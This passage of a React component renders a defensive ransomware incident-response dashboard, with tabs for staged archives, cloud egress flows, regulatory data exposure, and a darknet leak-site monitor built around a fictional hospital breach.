                <div style={{ fontSize: 11, color: "var(--muted)", fontWeight: 700, marginBottom: 4 }}>
                  Staging Directory Path:
                </div>
                <div style={{ background: "var(--bg)", padding: "6px 10px", borderRadius: 4, fontFamily: "monospace", fontSize: 11, color: "var(--cyan)", wordBreak: "break-all" }}>
                  {selectedArchive.stagingDirectory}
                </div>
              </div>

              <div>
                <div style={{ fontSize: 11, color: "var(--muted)", fontWeight: 700, marginBottom: 4, display: "flex", alignItems: "center", gap: 6 }}>
                  <Terminal size={12} color="var(--primary)" />
                  Process Command-Line Evidence (Process Creation EID 4688 / Sysmon 1):
                </div>
                <pre
                  style={{
                    background: "var(--bg)",
                    padding: "10px",
                    borderRadius: 6,
                    fontFamily: "monospace",
                    fontSize: 10.5,
                    color: "var(--fg-2)",
                    overflowX: "auto",
                    whiteSpace: "pre-wrap",
                    border: "1px solid var(--border)",
                    lineHeight: 1.4
                  }}
                >
                  {selectedArchive.commandLineEvidence}
                </pre>
              </div>

              <div>
                <div style={{ fontSize: 11, color: "var(--muted)", fontWeight: 700, marginBottom: 4 }}>
                  SHA-256 Merkle Hash:
                </div>
                <div style={{ background: "var(--surface-2)", padding: "6px 10px", borderRadius: 4, fontFamily: "monospace", fontSize: 10, color: "var(--muted)", wordBreak: "break-all" }}>
                  {selectedArchive.sha256}
                </div>
              </div>

              <div style={{ display: "flex", gap: 8, marginTop: 4 }}>
                <button
                  onClick={() => handleQuarantine(selectedArchive.id)}
                  className="btn-secondary"
                  style={{ flex: 1, justifyContent: "center" }}
                  disabled={selectedArchive.status === "QUARANTINED"}
                >
                  <ShieldCheck size={14} color="var(--primary)" />
                  {selectedArchive.status === "QUARANTINED" ? "Quarantine Active" : "Quarantine File & Revoke Permissions"}
                </button>
              </div>
            </div>
          )}
        </div>
      )}

      {/* TAB 2: OUTBOUND NETFLOW & CLOUD EGRESS */}
      {activeTab === "EGRESS" && (
        <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
          {/* Egress Action Banner */}
          <div
            style={{
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              background: "var(--surface-2)",
              padding: "12px 16px",
              borderRadius: 8,
              border: "1px solid var(--border)"
            }}
          >
            <div>
              <h3 style={{ fontSize: 14, fontWeight: 800, color: "var(--fg)" }}>
                Suspicious High-Volume Egress Streams Detected
              </h3>
              <p style={{ fontSize: 12, color: "var(--muted)", marginTop: 2 }}>
                High-speed egress detected over port 443/8443 to MEGA.nz, Dropbox, and bulletproof VPS nodes. Correlated with 7z split archives.
              </p>
            </div>

            <button
              onClick={handleTriggerSinkhole}
              className="btn-primary"
              style={{ background: "var(--rose)", color: "#fff" }}
              disabled={isSinkholing}
            >
              <Zap size={14} />
              {isSinkholing ? "Deploying Perimeter Sinkhole..." : "Trigger Perimeter Sinkhole (Block Cloud Targets)"}
            </button>
          </div>

          {/* Egress Telemetry Table */}
          <div className="card-tactical" style={{ overflow: "hidden" }}>
            <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 12 }}>
              <thead>
                <tr style={{ background: "var(--surface-2)", borderBottom: "1px solid var(--border)" }}>
                  <th style={{ textAlign: "left", padding: "10px 12px", color: "var(--muted)", fontWeight: 700 }}>TIMESTAMP</th>
                  <th style={{ textAlign: "left", padding: "10px 12px", color: "var(--muted)", fontWeight: 700 }}>SOURCE HOST / IP</th>
                  <th style={{ textAlign: "left", padding: "10px 12px", color: "var(--muted)", fontWeight: 700 }}>DESTINATION CLOUD ENDPOINT</th>
                  <th style={{ textAlign: "left", padding: "10px 12px", color: "var(--muted)", fontWeight: 700 }}>PROTOCOL</th>
                  <th style={{ textAlign: "right", padding: "10px 12px", color: "var(--muted)", fontWeight: 700 }}>TRANSFERRED</th>
                  <th style={{ textAlign: "right", padding: "10px 12px", color: "var(--muted)", fontWeight: 700 }}>SPEED</th>
                  <th style={{ textAlign: "center", padding: "10px 12px", color: "var(--muted)", fontWeight: 700 }}>STATUS</th>
                </tr>
              </thead>
              <tbody>
                {egressFlows.map((flow) => {
                  const isBlocked = flow.status === "BLOCKED_FIREWALL";
                  return (
                    <tr key={flow.id} style={{ borderBottom: "1px solid var(--border-subtle)" }}>
                      <td style={{ padding: "10px 12px", fontFamily: "monospace", color: "var(--fg-2)" }}>
                        {flow.timestamp}
                      </td>
                      <td style={{ padding: "10px 12px" }}>
                        <div style={{ fontWeight: 700, color: "var(--fg)" }}>{flow.sourceHost}</div>
                        <div style={{ fontSize: 10, color: "var(--muted)", fontFamily: "monospace" }}>{flow.sourceIp}</div>
                      </td>
                      <td style={{ padding: "10px 12px" }}>
                        <div style={{ fontWeight: 700, color: "var(--cyan)", display: "flex", alignItems: "center", gap: 6 }}>
                          <UploadCloud size={13} />
                          {flow.destinationDomain}
                        </div>
                        <div style={{ fontSize: 10, color: "var(--muted)", fontFamily: "monospace" }}>
                          {flow.destinationIp}:{flow.port} ({flow.destinationService})
                        </div>
                      </td>
                      <td style={{ padding: "10px 12px", color: "var(--fg-2)" }}>{flow.protocol}</td>
                      <td style={{ padding: "10px 12px", textAlign: "right", fontWeight: 700, color: "var(--rose)" }}>
                        {(flow.transferredMB / 1024).toFixed(2)} GB
                      </td>
                      <td style={{ padding: "10px 12px", textAlign: "right", color: "var(--amber)", fontWeight: 600 }}>
                        {flow.transferSpeedMBs} MB/s
                      </td>
                      <td style={{ padding: "10px 12px", textAlign: "center" }}>
                        <span
                          style={{
                            fontSize: 9.5,
                            fontWeight: 800,
                            padding: "2px 7px",
                            borderRadius: 4,
                            background: isBlocked ? "rgba(16, 185, 129, 0.15)" : "rgba(244, 63, 94, 0.15)",
                            color: isBlocked ? "var(--primary)" : "var(--rose)",
                            border: `1px solid ${isBlocked ? "rgba(16, 185, 129, 0.3)" : "rgba(244, 63, 94, 0.3)"}`
                          }}
                        >
                          {flow.status}
                        </span>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* TAB 3: DATA EXPOSURE & REGULATORY CLASSIFICATION */}
      {activeTab === "EXPOSURE" && (
        <div style={{ display: "grid", gridTemplateColumns: "1.3fr 1fr", gap: 16 }}>
          <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
            <div className="card-tactical" style={{ overflow: "hidden" }}>
              <div style={{ padding: "12px 14px", borderBottom: "1px solid var(--border)", background: "var(--surface-2)" }}>
                <h3 style={{ fontSize: 13, fontWeight: 800, color: "var(--fg)" }}>
                  Staged Sensitive Data Repositories & Regulatory Triggers
                </h3>
              </div>

              <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 12 }}>
                <thead>
                  <tr style={{ background: "var(--surface)", borderBottom: "1px solid var(--border)" }}>
                    <th style={{ textAlign: "left", padding: "10px 12px", color: "var(--muted)", fontWeight: 700 }}>DIRECTORY & SERVER</th>
                    <th style={{ textAlign: "left", padding: "10px 12px", color: "var(--muted)", fontWeight: 700 }}>DATA CATEGORY</th>
                    <th style={{ textAlign: "right", padding: "10px 12px", color: "var(--muted)", fontWeight: 700 }}>RECORDS</th>
                    <th style={{ textAlign: "center", padding: "10px 12px", color: "var(--muted)", fontWeight: 700 }}>STAGED?</th>
                  </tr>
                </thead>
                <tbody>
                  {INITIAL_DATA_EXPOSURE.map((item) => {
                    const isSelected = selectedExposure?.id === item.id;
                    return (
                      <tr
                        key={item.id}
                        onClick={() => setSelectedExposure(item)}
                        style={{
                          borderBottom: "1px solid var(--border-subtle)",
                          background: isSelected ? "rgba(245, 158, 11, 0.08)" : "transparent",
                          cursor: "pointer"
                        }}
                      >
                        <td style={{ padding: "10px 12px" }}>
                          <div style={{ fontWeight: 700, color: isSelected ? "var(--amber)" : "var(--fg)", wordBreak: "break-all" }}>
                            {item.directoryPath}
                          </div>
                          <div style={{ fontSize: 10, color: "var(--muted)", fontFamily: "monospace" }}>{item.serverHost}</div>
                        </td>
                        <td style={{ padding: "10px 12px" }}>
                          <span
                            style={{
                              fontSize: 10,
                              fontWeight: 800,
                              padding: "2px 6px",
                              borderRadius: 4,
                              background: item.category === "HIPAA_PHI"
                                ? "rgba(244, 63, 94, 0.15)"
                                : item.category === "PCI_DSS"
                                ? "rgba(245, 158, 11, 0.15)"
                                : "rgba(6, 182, 212, 0.15)",
                              color: item.category === "HIPAA_PHI"
                                ? "var(--rose)"
                                : item.category === "PCI_DSS"
                                ? "var(--amber)"
                                : "var(--cyan)",
                              border: "1px solid var(--border)"
                            }}
                          >
                            {item.category}
                          </span>
                        </td>
                        <td style={{ padding: "10px 12px", textAlign: "right", fontWeight: 700, color: "var(--fg)" }}>
                          {item.recordCount.toLocaleString()}
                        </td>
                        <td style={{ padding: "10px 12px", textAlign: "center" }}>
                          {item.stagedInArchive ? (
                            <span style={{ color: "var(--rose)", fontWeight: 700, fontSize: 11 }}>YES (Staged)</span>
                          ) : (
                            <span style={{ color: "var(--primary)", fontWeight: 700, fontSize: 11 }}>NO (Safe)</span>
                          )}
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          </div>

          {/* Regulatory Impact Card */}
          {selectedExposure && (
            <div className="card-tactical" style={{ padding: 16, display: "flex", flexDirection: "column", gap: 14 }}>
              <div style={{ borderBottom: "1px solid var(--border)", paddingBottom: 10 }}>
                <span style={{ fontSize: 10, color: "var(--muted)", fontWeight: 700 }}>LEGAL COMPLIANCE EXPOSURE</span>
                <h3 style={{ fontSize: 15, fontWeight: 800, color: "var(--amber)", marginTop: 2 }}>
                  {selectedExposure.category} Assessment
                </h3>
              </div>

              <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                <span style={{ fontSize: 11, color: "var(--muted)", fontWeight: 700 }}>Compromised Data Attributes:</span>
                <div style={{ display: "flex", flexWrap: "wrap", gap: 6 }}>
                  {selectedExposure.sampleDataTypes.map((dt, idx) => (
                    <span
                      key={idx}
                      style={{
                        fontSize: 10.5,
                        background: "var(--surface-2)",
                        color: "var(--fg)",
                        padding: "3px 8px",
                        borderRadius: 4,
                        border: "1px solid var(--border)"
                      }}
                    >
                      {dt}
                    </span>
                  ))}
                </div>
              </div>

              <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                <span style={{ fontSize: 11, color: "var(--muted)", fontWeight: 700 }}>Statutory Frameworks Triggered:</span>
                <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                  {selectedExposure.regulationsTriggered.map((reg, idx) => (
                    <div
                      key={idx}
                      style={{
                        background: "var(--surface-2)",
                        padding: "8px 12px",
                        borderRadius: 6,
                        border: "1px solid var(--border)",
                        display: "flex",
                        justifyContent: "space-between",
                        alignItems: "center"
                      }}
                    >
                      <div style={{ fontWeight: 700, fontSize: 12, color: "var(--rose)" }}>{reg}</div>
                      <span style={{ fontSize: 10, color: "var(--muted)", fontFamily: "monospace" }}>Mandatory Notification</span>
                    </div>
                  ))}
                </div>
              </div>

              <div style={{ background: "rgba(244, 63, 94, 0.08)", padding: 12, borderRadius: 6, border: "1px solid rgba(244, 63, 94, 0.2)" }}>
                <div style={{ fontSize: 11, fontWeight: 700, color: "var(--rose)", marginBottom: 4 }}>
                  Estimated Regulatory Exposure:
                </div>
                <div style={{ fontSize: 12, color: "var(--fg-2)", lineHeight: 1.4 }}>
                  Under HIPAA Enforcement Final Rule Tier 4 (§ 160.404) & GDPR Art. 83(5), exfiltration of {selectedExposure.recordCount.toLocaleString()} records carries statutory civil monetary liability up to <strong>$2,014,000</strong> per violation category.
                </div>
              </div>
            </div>
          )}
        </div>
      )}

      {/* TAB 4: DARKNET LEAK SITE & PROOF VERIFICATION */}
      {activeTab === "LEAK_MONITOR" && (
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16 }}>
          <div className="card-tactical" style={{ padding: 16, display: "flex", flexDirection: "column", gap: 12 }}>
            <div style={{ borderBottom: "1px solid var(--border)", paddingBottom: 10 }}>
              <span style={{ fontSize: 10, color: "var(--muted)", fontWeight: 700 }}>DARKNET BLOG SCRAPER</span>
              <h3 style={{ fontSize: 15, fontWeight: 800, color: "var(--purple)", marginTop: 2, display: "flex", alignItems: "center", gap: 8 }}>
                <Globe size={16} />
                Tor Onion Leak Blog Monitor
              </h3>
            </div>

            <div style={{ background: "var(--surface-2)", padding: 10, borderRadius: 6, fontSize: 11, fontFamily: "monospace" }}>
              <div style={{ color: "var(--muted)" }}>Monitored Onion Address:</div>
              <div style={{ color: "var(--cyan)", marginTop: 2 }}>{currentCase.torNegotiationUrl}</div>
            </div>

            <div style={{ border: "1px solid var(--border)", borderRadius: 6, padding: 12, background: "var(--bg)" }}>
              <div style={{ fontSize: 12, fontWeight: 700, color: "var(--rose)", marginBottom: 6 }}>
                ⚠️ Published Victim Profile on Darknet:
              </div>
              <p style={{ fontSize: 11.5, color: "var(--fg-2)", lineHeight: 1.5 }}>
                &quot;Mercy General Health System — 1.8 TB of internal documents, patient medical charts, SSNs, and billing databases will be published or auctioned in 72 hours if ransom demand of 28.5 BTC is not satisfied.&quot;
              </p>
            </div>

            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", background: "var(--surface-2)", padding: 10, borderRadius: 6, fontSize: 11 }}>
              <span style={{ color: "var(--muted)" }}>Last Proof Crawler Sync:</span>
              <span style={{ color: "var(--primary)", fontWeight: 700 }}>2 minutes ago (Realtime Tor Proxy)</span>
            </div>
          </div>

          <div className="card-tactical" style={{ padding: 16, display: "flex", flexDirection: "column", gap: 12 }}>
            <div style={{ borderBottom: "1px solid var(--border)", paddingBottom: 10 }}>
              <span style={{ fontSize: 10, color: "var(--muted)", fontWeight: 700 }}>EVIDENCE PRESERVATION</span>
              <h3 style={{ fontSize: 15, fontWeight: 800, color: "var(--primary)", marginTop: 2, display: "flex", alignItems: "center", gap: 8 }}>
                <ShieldCheck size={16} />
                Forensic Proof Carving & Chain of Custody
              </h3>
            </div>

            <div style={{ fontSize: 12, color: "var(--fg-2)", lineHeight: 1.5 }}>
              Aegis Evidence Engine automatically scrapes published sample proof archives, computes SHA-256 hashes, and indexes proof files for legal counsel to verify whether sensitive client data matches confirmed exfiltration logs.
            </div>

            <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
              <div style={{ background: "var(--surface-2)", padding: 10, borderRadius: 6, display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                <div>
                  <div style={{ fontSize: 11.5, fontWeight: 700, color: "var(--fg)" }}>Proof_Sample_Batch_01.pdf</div>
                  <div style={{ fontSize: 10, color: "var(--muted)" }}>Redacted Hospital Billing Ledger (12 Pages)</div>
                </div>
                <span style={{ fontSize: 10, color: "var(--primary)", fontWeight: 700 }}>FRE 901 Sealed</span>
              </div>

              <div style={{ background: "var(--surface-2)", padding: 10, borderRadius: 6, display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                <div>
                  <div style={{ fontSize: 11.5, fontWeight: 700, color: "var(--fg)" }}>Patient_Export_Audit_Proof.csv</div>
                  <div style={{ fontSize: 10, color: "var(--muted)" }}>100 Patient Records Sample with SSN and ICD-10</div>
                </div>
                <span style={{ fontSize: 10, color: "var(--primary)", fontWeight: 700 }}>FRE 901 Sealed</span>
              </div>
            </div>

            <button onClick={handleExportDossier} className="btn-primary" style={{ marginTop: 6, justifyContent: "center" }}>
              <Download size={14} />
              Export Full Exfiltration Forensic Pack (ZIP)
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
